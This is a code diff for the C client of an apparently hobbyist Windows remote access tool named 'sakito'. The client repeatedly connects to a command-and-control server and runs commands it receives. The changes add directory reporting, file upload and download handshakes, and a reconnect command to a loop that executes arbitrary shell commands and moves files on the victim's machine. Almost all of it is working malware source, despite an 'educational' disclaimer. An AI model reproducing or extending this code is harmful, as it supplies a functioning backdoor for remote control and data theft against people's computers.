@@ -4,6 +4,8 @@ Use educationally/legally.
 */
 #include <ws2tcpip.h>
 #include <stdint.h>
+#include <errno.h>
+#include <stdio.h>
 #include "sakito_core.h"
 
 #define HOST "127.0.0.1"
@@ -42,22 +44,35 @@ int c2_connect(const SOCKET connect_socket) {
 		return SOCKET_ERROR;
 	}
 
-	return 1;
+	return SUCCESS;
 }
 
 // Function to execute command.
 BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
 	BOOL i_result = sakito_win_cp(connect_socket, buf);
 
-	if (send(connect_socket, "\x11\x13\xcf", 3, 0) < 1)
+	if (send(connect_socket, EOS, 1, 0) < 1)
 		return SOCKET_ERROR;
 
 	return i_result;
 }
 
+int ch_dir(char* const dir, SOCKET connect_socket) {
+	char chdir_result[] = "1";
+	_chdir(dir);
+	if (errno == ENOENT)
+		chdir_result[0] = '0';
+
+	if (send(connect_socket, chdir_result, 1, 0) < 1)
+		return SOCKET_ERROR;
+
+	return SUCCESS;
+}
+
 // Function to receive file from client (TCP file transfer).
 int send_file(const SOCKET connect_socket, char* const buf) {
-	int32_t f_size = -1;
+	// Default f_size value = -1
+	int32_t f_size = FAILURE;
 
 	// Open file with read permissions.
 	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);
@@ -70,12 +85,23 @@ int send_file(const SOCKET connect_socket, char* const buf) {
 		f_size = (int32_t)largeint_struct.QuadPart;
 	}
 
-	return sakito_win_sendf(h_file, connect_socket, buf, f_size);
+	if (sakito_win_sendf(h_file, connect_socket, buf, f_size) < 1)
+		return SOCKET_ERROR;
+
+	// Receive file transfer finished byte.
+	if (recv(connect_socket, buf, 1, 0) < 1)
+		return SOCKET_ERROR;
+
+	return SUCCESS;
 }
 
 // Function to receive file from client (TCP file transfer).
 int recv_file(const SOCKET connect_socket, char* const buf) {
 	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);
+
+	// Send file transfer start byte.
+	if (send(connect_socket, FTRANSFER_START, 1, 0) < 1)
+		return SOCKET_ERROR;
 
 	// Receive file size.
 	if (recv(connect_socket, buf, sizeof(int32_t), 0) < 1)
@@ -84,13 +110,25 @@ int recv_file(const SOCKET connect_socket, char* const buf) {
 	// Deserialize f_size.
 	int32_t f_size = ntohl_conv(&*(buf));
 
+	int i_result = SUCCESS;
+
 	if (f_size > 0)
 		// Windows TCP file transfer (recv) function located in sakito_tools.h.
-		int i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);
+		i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);
 
+	// Close the file.
 	CloseHandle(h_file);
 
 	return i_result;
+}
+
+int send_cwd(char* const buf, SOCKET connect_socket) {
+	GetCurrentDirectory(BUFLEN, buf);
+
+	if (send(connect_socket, buf, strlen(buf)+1, 0) < 1)
+		return SOCKET_ERROR;
+
+	return SUCCESS;
 }
 
 // Main function for connecting to c2 server & parsing c2 commands.
@@ -99,44 +137,63 @@ int main(void) {
 		// Create the connect socket.
 		const SOCKET connect_socket = create_socket();
 
-		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-	       occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
-		   statement will parse & execute functions based on the order of probability.*/
+		/* 
+		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
+	    	occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
+		statement will parse & execute functions based on the order of probability.
+		*/
 		if (connect_socket != INVALID_SOCKET) {
 			int i_result = c2_connect(connect_socket);
-			while (i_result > 0) {
+
+			if (i_result) {
+				_init:
 				// 8192 == Max command line command length in windows + 1 for null termination.
-				char buf[BUFLEN + 1] = { 0 };
+				char buf[BUFLEN+1] = { 0 };
+				i_result = recv(connect_socket, buf, 1, 0);
+				
+				while (i_result > 0) {
+					if (send_cwd(buf, connect_socket) < 1)
+						break;
 
-				if (recv(connect_socket, buf, BUFLEN, 0) < 1)
-					break;
+					memset(buf, '\0', BUFLEN);
 
-				// buf[0] is the command code and buf+1 is pointing to the parsed data.
-				switch (buf[0]) {
-					case '0':
-						i_result = exec_cmd(connect_socket, buf+1);
+					if (recv(connect_socket, buf, BUFLEN, 0) < 1)
 						break;
-					case '1':
-						// Change directory.
-						_chdir(buf+1);
-						break;
-					case '2':
-						// Exit.
-						return 0;
-					case '3':
-						// Upload file to client system.
-						i_result = recv_file(connect_socket, buf);
-						break;
-					case '4':
-						// Download file from client system.
-						i_result = send_file(connect_socket, buf);
-						break;
+
+					// buf[0] is the command code and buf+1 is pointing to the parsed data.
+					switch (buf[0]) {
+						case '0':
+							i_result = exec_cmd(connect_socket, buf+1);
+							break;
+						case '1':
+							// Change directory.
+							i_result = ch_dir(buf+1, connect_socket);
+							break;
+						case '2':
+							// Exit.
+							return EXIT_SUCCESS;
+						case '3':
+							// Upload file to client system.
+							i_result = recv_file(connect_socket, buf);
+							break;
+						case '4':
+							// Download file from client system.
+							i_result = send_file(connect_socket, buf);
+							break;
+						case '5':
+							// Reinitiate connection (backgrounded).
+							goto _init;
+						case '6':
+							// Server-side error occurred re-receive command.
+							break;
+					}
 				}
 			}
 		}
+
 		// If unable to connect or an error occurs sleep 8 seconds.
 		Sleep(8000);
 	}
 
-	return -1;
+	return FAILURE;
 }
